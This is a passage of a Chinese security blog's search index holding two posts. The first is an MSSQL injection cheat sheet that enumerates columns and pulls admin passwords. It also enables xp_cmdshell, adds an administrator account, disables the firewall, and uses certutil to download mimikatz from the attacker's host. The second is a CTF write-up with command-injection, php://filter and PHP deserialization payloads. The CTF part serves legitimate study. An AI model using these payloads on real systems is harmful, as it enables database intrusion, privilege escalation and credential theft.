title="爆当前表中的列"></a>爆当前表中的列</h4><pre><code class="mssql">article.asp?id=6 group by admin.username having 1=1--article.asp?id=6 group by admin.username,admin.password having 1=1--</code></pre><h4 id="爆任意表和列"><a href="#爆任意表和列" class="headerlink" title="爆任意表和列"></a>爆任意表和列</h4><pre><code class="mssql">and (select top 1 name from (select top N id,name from sysobjects where xtype=char(85)) T order by id desc)&gt;1and (select top col_name(object_id('admin'),N) from sysobjects)&gt;1</code></pre><h4 id="爆数据库数据"><a href="#爆数据库数据" class="headerlink" title="爆数据库数据"></a>爆数据库数据</h4><pre><code class="mssql">and (select top 1 password from admin where id=N)&gt;1</code></pre><h4 id="Exmaples"><a href="#Exmaples" class="headerlink" title="Exmaples"></a>Exmaples</h4><pre><code class="mssql">query: SELECT username, password FROM Users WHERE id = '1';1' HAVING 1=1                                       -- 错误1' GROUP BY username HAVING 1=1--                   -- 错误1' GROUP BY username, password HAVING 1=1--         -- 正确Group By可以用来测试列名USE masterGORECONFIGURE --先执行一次刷新，处理上次的配置GOEXEC sp_configure 'show advanced options',1 --启用xp_cmdshell的高级配置GORECONFIGURE --刷新配置GOEXEC sp_configure 'xp_cmdshell',1  --打开xp_cmdshell,可以调用SQL系统之外的命令GORECONFIGUREGO--使用xp_cmdshell在D盘创建一个myfile 文件夹EXEC xp_cmdshell 'mkdir d:\myfile',no_output --[no_output]表示是否输出信息GOsp_configure 'show advanced options',1; (记得reconfigure) sp_configure 'xp_cmdshell',1;（记得reconfigure）启用xp_cmdshellexec xp_cmdshell 'dir c:\ /s /b |findstr "key"|findstr "txt"'; 找到key的位置exec xp_cmdshell 'type key位置"'; 直接读key内容，不过一般不会让你有直接读的权限exec xp_cmdshell 'cacls c:\ /s /b |findstr "key"|findstr "txt" /E /G adminstrator:F'; 改变文件操作权限，F是所有权限，改变权限后再读就能成功exec xp_cmdshell 'net user username password /add';exec xp_cmdshell 'net localgroup administrators username /add';创建账户exec xp_cmdshell 'netsh firewall set opmode disable'; 如果目标开了防火墙，那么即使开启3389端口也无法连接，这条命令用于关闭防火墙。exec xp_cmdshell 'certutil -urlcache -f -split http://本机:8000/mimikazts.exe';如果不能建立账户，那么需要工具去破解系统账户的密码。这里使用的mimikazts。exec master..xp_cmdshell ‘dir “C:\Documents and Settings\Administrator\桌面\” /A -D /B’exec xp_cmdshell ‘type “C:\Documents and Settings\Administrator\桌面\key.txt”‘</code></pre><p>Reference：1.MSSQL注入攻击<a href="https://www.anquanke.com/post/id/86011" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86011</a> </p><p>​                    2.Sql注入备忘录-Zedd‘s Blog   <a href="https://blog.zeddyu.info/2019/03/06/Sqli%E5%A4%87%E5%BF%98%E5%BD%95/" target="_blank" rel="noopener">https://blog.zeddyu.info/2019/03/06/Sqli%E5%A4%87%E5%BF%98%E5%BD%95/</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> SQL injection </tag>
            
            <tag> Summary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Immerse In BUU Day1</title>
      <link href="/posts/ab7.html"/>
      <url>/posts/ab7.html</url>
      
        <content type="html"><![CDATA[<p>刚弄好新博客，慢慢来刷题了。</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>命令注入，<code>?ip=127.0.0.1|ls</code>发现存在flag.php和index.php,cat的时候发现各种口吐芬芳，手动fuzz了一下发现ban掉了flag的贪婪匹配，bash，空格。</p><p>index.php里应该有源码，问题在于绕过空格过滤。</p><h3 id="绕过空格过滤："><a href="#绕过空格过滤：" class="headerlink" title="绕过空格过滤："></a>绕过空格过滤：</h3><ul><li><p>[:space:]    不行，[]被过滤</p></li><li><p>cat&lt;&gt;/index  不行，/&lt;&gt;均被过滤</p></li><li><p><code>$IFS$1</code>：可以</p><pre><code class="shell">payload:?ip=1|cat$IFS$1index.php</code></pre><p><a href="https://www.jianshu.com/p/6e09a0996d9c" target="_blank" rel="noopener">关于【shell】IFS和$*变量:</a></p></li></ul><p>一般来说的形式有：</p><pre><code class="shell">cat$IFS$1/flagcat${IFS}/flagcat$IFS/flag</code></pre><p>  另外补充一下Linux中各种变量的的意思</p><pre><code class="shell">$# 是传给脚本的参数个数$0 是脚本本身的名字$1 是传递给该shell脚本的第一个参数$2 是传递给该shell脚本的第二个参数$@ 是传给脚本的所有参数的列表$* 是以一个单字符串显示所有向脚本传递的参数，与位置变量不同，参数可超过9个$$ 是脚本运行的当前进程ID号$? 是显示最后命令的退出状态，0表示没有错误，其他表示有错误</code></pre><pre><code>/?ip=|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){    echo preg_match("/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);    die("fxck your symbol!");  } else if(preg_match("/ /", $ip)){    die("fxck your space!");  } else if(preg_match("/bash/", $ip)){    die("fxck your bash!");  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){    die("fxck your flag!");  }  $a = shell_exec("ping -c 4 ".$ip);  echo "";  print_r($a);}?&gt;</code></pre><p>看到源码，下一步是bypass 过滤的flag字符串。</p><h3 id="绕过flag过滤"><a href="#绕过flag过滤" class="headerlink" title="绕过flag过滤"></a>绕过flag过滤</h3><h4 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h4><p>这里注意到有一个$a可以覆盖，联想到之前拆一句话小马的做法：</p><pre><code class="shell">payload：?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</code></pre><h4 id="其他的payload："><a href="#其他的payload：" class="headerlink" title="其他的payload："></a>其他的payload：</h4><pre><code class="shell">?ip=1;echo$IFS$1Y2F0IGZsYWcucGhwCg==|base64$IFS$1-d|sh   #base64+sh（bash被过滤了）?ip=127.0.0.1;cat$IFS$9`ls` #反引号内联执行</code></pre><h4 id="这里说一下反引号内联："><a href="#这里说一下反引号内联：" class="headerlink" title="这里说一下反引号内联："></a>这里说一下反引号内联：</h4><p>命令替代，大部分<code>Unix shell</code>以及编程语言如<code>Perl</code>、<code>PHP</code>以及<code>Ruby</code>等都以成对的重音符(反引号)作指令替代，意思是以某一个指令的输出结果作为另一个指令的输入项。例如以下指令:</p><pre><code class="shell">echo It is now `date` 等价于：echo It is now 一 5月 5 05:16:04 GMT 2020在正式执行时会产生以下输出结果：It is now 一 5月 5 05:16:04 GMT 2020</code></pre><h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p>点击tips发现url变成了：<code>buuoj.cn/?file=flag.php</code>，flag应该是被注释掉了。伪协议读取即可。</p><pre><code>?file=php://filter/convert.base64-encode/resource=flag.php</code></pre><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>打开题目，给出源码。</p><pre><code class="php"> &lt;?php  $text = $_GET["text"];$file = $_GET["file"];$password = $_GET["password"];if(isset($text)&amp;&amp;(file_get_contents($text,'r')==="welcome to the zjctf")){    echo "&lt;br&gt;&lt;h1&gt;".file_get_contents($text,'r')."&lt;/h1&gt;&lt;/br&gt;";    if(preg_match("/flag/",$file)){        echo "Not now!";        exit();     }else{        include($file);  //useless.php        $password = unserialize($password);        echo $password;    }}else{    highlight_file(__FILE__);}?&gt; </code></pre><p><strong>第一个绕过：</strong></p><pre><code>if(isset($text)&amp;&amp;(file_get_contents($text,'r')==="welcome to the zjctf"))</code></pre><p>这里需要我们传入一个文件且其内容为welcome to the  zjctf，这样的话往后面看没有其他可以利用的点，我们就无法写入文件再读取，就剩下了一个data伪协议。data协议通常是用来执行PHP代码，然而我们也可以将内容写入data协议中然后让file_get_contents函数取读取。构造如下：</p><pre><code>text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code></pre><p>当然也可以不需要base64，但是一般为了绕过某些过滤都会用到base64。data://text/plain,welcome to the zjctf</p><p><strong>第二个绕过</strong></p><pre><code>$file = $_GET["file"];if(preg_match("/flag/",$file)){        echo "Not now!";        exit();     }else{        include($file);  //useless.php        $password = unserialize($password);        echo $password;    }</code></pre><p>这里有file参数可控，但是无法直接读取flag，可以直接读取/etc/passwd，但针对php文件我们需要进行base64编码，否则读取不到其内容，所以以下无法使用：</p><pre><code>file=useless.php</code></pre><p>所以下面采用filter来读源码，但上面提到过针对php文件需要base64编码，所以使用其自带的base64过滤器。</p><pre><code>php://filter/read=convert.base64-encode/resource=useless.php</code></pre><p>读到的useless.php内容如下：</p><pre><code>&lt;?php  class Flag{  //flag.php      public $file;      public function __tostring(){          if(isset($this-&gt;file)){              echo file_get_contents($this-&gt;file);             echo "&lt;br&gt;";        return ("U R SO CLOSE !///COME ON PLZ");        }      }  }  ?&gt;</code></pre><p><strong>第三个绕过</strong></p><pre><code>$password = $_GET["password"];include($file);  //useless.php$password = unserialize($password);echo $password;</code></pre><p>这里的file是我们可控的，所以在本地测试后有执行下面代码即可出现payload：</p><pre><code>&lt;?php  class Flag{  //flag.php      public $file="flag.php";      public function __tostring(){          if(isset($this-&gt;file)){              echo file_get_contents($this-&gt;file);             echo "&lt;br&gt;";        return ("U R SO CLOSE !///COME ON PLZ");        }      }  }  $a = new Flag();echo serialize($a);?&gt;//O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}</code></pre><p>最后payload</p><pre><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:%22Flag%22:1:%7Bs:4:%22file%22;s:8:%22flag.php%22;%7D</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
